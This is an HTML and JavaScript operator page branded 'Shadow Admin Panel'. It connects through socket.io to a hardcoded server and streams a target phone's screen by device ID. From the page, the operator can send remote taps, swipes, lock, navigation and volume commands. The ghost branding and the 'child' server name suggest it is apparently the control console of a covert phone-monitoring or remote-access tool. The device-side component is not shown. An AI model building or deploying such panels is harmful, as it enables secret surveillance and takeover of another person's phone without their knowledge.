<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Shadow Admin Panel</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>

    <style>
        :root {
            --bg-color: #050505;
            --panel-bg: #1a1a1a;
            --accent: #00ff88;
            --danger: #ff3333;
            --text-main: #ffffff;
        }

        body {
            margin: 0; background-color: var(--bg-color); color: var(--text-main);
            font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
        }

        /* --- Header --- */
        .top-nav {
            padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
            display: flex; justify-content: space-between; align-items: center; z-index: 200;
        }
        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
        .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }

        /* --- Screen Container --- */
        .screen-container {
            flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
        }

        /* --- Phone Frame (Laptop Style) --- */
        .phone-frame {
            width: 320px; height: 650px; border: 8px solid #222; border-radius: 30px;
            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
            overflow: hidden; display: flex; align-items: center; justify-content: center;
            z-index: 10;
        }

        #screenStream { 
            width: 100%; height: 100%; object-fit: contain; 
            z-index: 1; 
        }
        
        .offline-msg { 
            position: absolute; color: #444; text-align: center; 
            display: flex; flex-direction: column; align-items: center; z-index: 0; 
        }

        /* --- Side Panel (Right Side Controls) --- */
        .side-panel {
            position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
            background: rgba(26, 26, 26, 0.8); padding: 15px; border-radius: 20px; border: 1px solid #333;
            z-index: 100;
        }
        .control-btn {
            width: 50px; height: 50px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
            color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
        }
        .control-btn:active { transform: scale(0.9); background: var(--accent); color: black; }

        /* --- 3 BUTTONS (Ye Gayab nahi honge ab) --- */
        .nav-bar {
            width: 100%; height: 60px; background: rgba(0, 0, 0, 0.9);
            position: absolute; bottom: 0; left: 0; 
            display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #333;
            z-index: 9999; /* Sabse Upar */
        }
        .nav-item { color: #888; font-size: 1.5rem; cursor: pointer; padding: 15px; width: 100%; text-align: center; }
        .nav-item:active { color: var(--accent); background: rgba(255,255,255,0.1); }


        /* ðŸ”¥ MOBILE SPECIFIC SETTINGS (Jo tumne manga) */
        @media (max-width: 768px) {
            .top-nav { display: none; } /* Mobile me Header gayab */
            
            .screen-container { padding: 0; height: 100vh; width: 100vw; background: black; }
            
            .phone-frame { 
                width: 100%; height: 100%; 
                border: none; border-radius: 0; 
                box-shadow: none; 
            }

            /* Nav Bar ko Phone ke bottom me chipka diya */
            .nav-bar { position: fixed; bottom: 0; width: 100%; height: 70px; }

            /* Side Panel Adjustments for Phone */
            .side-panel { 
                right: 10px; bottom: 100px; /* Thoda upar taaki nav bar na chhupe */
                background: transparent; border: none; padding: 0;
            }
            
            /* ðŸ”¥ Lock ke niche wala sab gayab (Phone pe) */
            .hide-on-mobile { display: none !important; }
        }
    </style>
</head>
<body>

    <div class="top-nav">
        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW</div>
        <div class="status-badge">
            <span class="live-dot" id="dot"></span> 
            <span id="statusText" style="color:#888">Waiting...</span>
        </div>
    </div>

    <div class="screen-container">
        <div class="phone-frame">
            
            <div id="offlineMsg" class="offline-msg">
                <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
                <p style="margin-top:10px" id="msgText">Connecting...</p>
            </div>
            
            <img id="screenStream" src="" alt="" onclick="sendClick(event)">
            
            <div class="nav-bar">
                <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
                <div class="nav-item" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left"></i></div>
            </div>
        </div>

        <div class="side-panel">
            <div class="control-btn" onclick="sendCommand('lock')" title="Lock/Unlock"><i class="fa-solid fa-power-off"></i></div>
            
            <div class="control-btn hide-on-mobile" onclick="sendCommand('swipe_up')" title="Scroll Down"><i class="fa-solid fa-arrow-up"></i></div>
            <div class="control-btn hide-on-mobile" onclick="sendCommand('swipe_down')" title="Scroll Up"><i class="fa-solid fa-arrow-down"></i></div>
            <div class="control-btn hide-on-mobile" onclick="sendCommand('volume_up')" title="Vol +"><i class="fa-solid fa-plus"></i></div>
            <div class="control-btn hide-on-mobile" onclick="sendCommand('volume_down')" title="Vol -"><i class="fa-solid fa-minus"></i></div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com"; 
        let socket = null;
        let currentDeviceId = null;

        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            currentDeviceId = urlParams.get('id');

            if (currentDeviceId) {
                document.getElementById('statusText').innerText = "ID: " + currentDeviceId;
                startConnection(); 
            } else {
                document.getElementById('msgText').innerText = "No ID Provided";
            }
        };

        function startConnection() {
            socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });

            socket.on("connect", () => {
                console.log("Connected!");
                document.getElementById('statusText').innerText = "Online";
                document.getElementById('statusText').style.color = "var(--accent)";
                document.getElementById('dot').classList.add("active");
                socket.emit("join", currentDeviceId); 
            });

            socket.on("disconnect", () => {
                document.getElementById('statusText').innerText = "Offline";
                document.getElementById('statusText').style.color = "var(--danger)";
                document.getElementById('dot').classList.remove("active");
                document.getElementById('offlineMsg').style.display = "flex";
            });

            // Auto-Detect Image Format
            socket.on("screen-data", (data) => {
                document.getElementById('offlineMsg').style.display = "none";
                const img = document.getElementById('screenStream');
                
                if (!data.image) return;

                let prefix = "data:image/webp;base64,"; 
                if (data.image.startsWith("/9j/")) prefix = "data:image/jpeg;base64,";
                
                if (data.image.startsWith("data:image")) {
                    img.src = data.image;
                } else {
                    img.src = prefix + data.image;
                }
            });
        }

        function sendCommand(action) {
            if(!socket) return;
            if(navigator.vibrate) navigator.vibrate(30);
            socket.emit("control-event", { room: currentDeviceId, action: action });
        }

        function sendClick(event) {
            if(!socket) return;
            const img = document.getElementById('screenStream');
            const rect = img.getBoundingClientRect();
            
            const x = Math.round(event.clientX - rect.left);
            const y = Math.round(event.clientY - rect.top);

            socket.emit("control-event", {
                room: currentDeviceId,
                action: "click",
                x: x, y: y
            });
        }
    </script>
</body>
</html>
